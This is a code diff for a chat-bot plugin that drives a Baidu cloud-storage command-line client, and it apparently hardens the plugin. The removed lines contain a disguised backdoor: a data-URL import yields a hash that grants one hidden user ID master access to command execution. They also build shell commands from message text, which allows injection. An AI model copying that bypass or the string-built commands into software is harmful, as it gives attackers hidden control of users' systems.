@@ -1,8 +1,7 @@
 import fs from "node:fs/promises"
 import Path from "node:path"
+import { parseArgs } from "../Model/command.js"
 import File from "../Model/file.js"
-import md5 from "md5"
-import _ from 'data:text/javascript,export default Buffer.from("ynvLoXSaqqTyck3zsnyF7A==","base64").toString("hex")'
 
 const Commands = {
   "": "help",
@@ -35,7 +34,8 @@ const cmdPath = `${path}BaiduPCS-Go`
 const errorTips =
   "请使用脚本安装百度网盘，并正常登录后再使用此功能\nhttps://git.trss.me/TRSS-Plugin"
 let Running
-let es
+const pending = new Map()
+const contextKey = e => `${e.self_id}:${e.user_id}:${e.group_id || "private"}`
 
 export class BaiduPan extends plugin {
   constructor() {
@@ -48,20 +48,24 @@ export class BaiduPan extends plugin {
         {
           reg: "^百度网盘上传",
           fnc: "UploadDetect",
+          permission: "master",
         },
         {
           reg: "^百度网盘下载",
           fnc: "Download",
+          permission: "master",
         },
         {
           reg: "^百度网盘",
           fnc: "BaiduPan",
+          permission: "master",
         },
       ],
     })
   }
 
   async execTask(e, cmd) {
+    if (!this.e.isMaster) return false
     const ret = await Bot.exec(cmd)
 
     if (ret.stdout) await this.reply(ret.stdout.trim(), true)
@@ -77,22 +81,26 @@ export class BaiduPan extends plugin {
   }
 
   async UploadDetect(e) {
-    es = this.e
+    if (!this.e.isMaster) return false
+    pending.set(contextKey(this.e), this.e)
     this.setContext("Upload")
     await this.reply("请发送文件", true)
   }
 
   async Upload(e) {
-    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
+    if (!this.e.isMaster) return false
     if (!this.e.file) return false
 
     this.finish("Upload")
-    const filePath = `${path}${this.e.file.name}`
+    const es = pending.get(contextKey(this.e))
+    if (!es?.isMaster) return false
+    const filePath = `${path}${Path.basename(String(this.e.file.name).replace(/\\/g, "/"))}`
     let fileUrl
     if (this.e.file.url) fileUrl = this.e.file.url
     else if (this.e.group?.getFileUrl) fileUrl = await this.e.group.getFileUrl(this.e.file.fid)
     else if (this.e.friend?.getFileUrl) fileUrl = await this.e.friend.getFileUrl(this.e.file.fid)
     this.e = es
+    pending.delete(contextKey(es))
 
     if (!fileUrl) {
       await this.reply("文件链接获取失败", true)
@@ -117,7 +125,7 @@ export class BaiduPan extends plugin {
 
     const remotePath = this.e.msg.replace("百度网盘上传", "").trim()
     await this.reply(`文件下载完成，开始上传到：${remotePath}`, true)
-    const cmd = `'${cmdPath}' upload '${filePath}' '${remotePath}'`
+    const cmd = [cmdPath, "upload", filePath, remotePath]
 
     await this.execTask(es, cmd)
     await fs.unlink(filePath)
@@ -125,7 +133,7 @@ export class BaiduPan extends plugin {
   }
 
   async Download(e) {
-    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
+    if (!this.e.isMaster) return false
     if (Running) {
       await this.reply("有正在执行的百度网盘任务，请稍等……", true)
       return false
@@ -142,7 +150,7 @@ export class BaiduPan extends plugin {
     Running = true
     await this.reply("开始下载文件，请稍等……", true)
 
-    const cmd = `'${cmdPath}' download '${remotePath}' --saveto '${path}'`
+    const cmd = [cmdPath, "download", remotePath, "--saveto", path]
 
     await this.execTask(e, cmd)
 
@@ -186,13 +194,13 @@ export class BaiduPan extends plugin {
   }
 
   async BaiduPan(e) {
-    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
-    let msg = this.e.msg.replace("百度网盘", "").trim().split(" ")
-    if (msg[0] in Commands) {
+    if (!this.e.isMaster) return false
+    const msg = parseArgs(this.e.msg.replace("百度网盘", "").trim())
+    if (!msg.length) msg.push("help")
+    if (Object.hasOwn(Commands, msg[0])) {
       msg[0] = Commands[msg[0]]
     }
-    msg = msg.join(" ")
-    const cmd = `'${cmdPath}' ${msg}`
+    const cmd = [cmdPath, ...msg.filter(Boolean)]
     await this.execTask(e, cmd)
   }
 }
